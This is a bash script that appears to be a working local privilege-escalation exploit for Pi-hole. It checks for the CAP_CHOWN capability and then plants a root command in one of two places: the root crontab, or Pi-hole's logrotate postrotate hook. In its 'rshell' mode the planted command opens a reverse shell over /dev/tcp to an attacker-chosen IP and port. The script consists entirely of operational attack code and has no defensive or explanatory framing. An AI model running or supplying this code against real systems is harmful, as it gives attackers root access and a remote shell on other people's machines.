#!/bin/bash
ROOTCMD='{ hostname;uptime;id;grep ^Cap /proc/self/status;pihole version; } >> /tmp/root-exec'

if [ "${1}" == "rshell" ];then
  #rshell $rshell_ip $rshell_port
  ROOTCMD="/usr/bin/flock -n /tmp/linnemanlabs-shell.lock /bin/bash -c 'exec 3<>/dev/tcp/${2}/${3} || exit 1; exec /usr/bin/script -qfc \"/bin/bash -i\" /dev/null <&3 >&3 2>&3' >/dev/null 2>&1"
fi

echo "[*] Checking for privilege escalation opportunities"
havecaps=no
while read -r name value rest; do
    [ "$name" = "CapAmb:" ] || continue
    case $value in *[13579bBdDfF]) havecaps="yes";; esac
    break
done < /proc/self/status
# should probably just check pihole versions and confirm conditions and make these functions for cleaner fallback calling etc
if [ "${havecaps}" = "yes" ];then
  echo "[*] we have CAP_CHOWN, trying to write root crontab"
  chown="$( command -v gnuchown || command -v chown )"
  ${chown} pihole:pihole /var/spool/cron/crontabs
  ${chown} pihole:pihole /var/spool/cron/crontabs/root 2>/dev/null || true
  echo "* * * * * ${ROOTCMD}" >> /var/spool/cron/crontabs/root
  chmod 600 /var/spool/cron/crontabs/root
  ${chown} root:crontab /var/spool/cron/crontabs/root
  ${chown} root:crontab /var/spool/cron/crontabs
  echo "[+] root crontab staged. command will run within 60 seconds"
else
  # confirm logrotate uses /etc/pihole/logrotate regardless if it exists or not, upgrades keep stale version around unused
  echo "[*] no CAP_CHOWN, trying to write pihole logrotate"
  mv -f /etc/pihole/logrotate /etc/pihole/logrotate.save 2>/dev/null || true
  cat > /etc/pihole/logrotate <<EOF
/var/log/pihole/pihole.log {
    daily
    rotate 1
    postrotate
        ${ROOTCMD}
    endscript
}
EOF
  chmod 600 /etc/pihole/logrotate
  echo "[+] logrotate staged. need to trigger a pihole-FTL restart, and wait for midnight for logrotate cron job"
fi

if [ "${1}" == "rshell" ];then
  cur="$( date +%S )"
  when="$[60-${cur}]"
  echo "[*] shell should connect back to ${2}:${3} soon (~${when} seconds)"
fi

exit 0
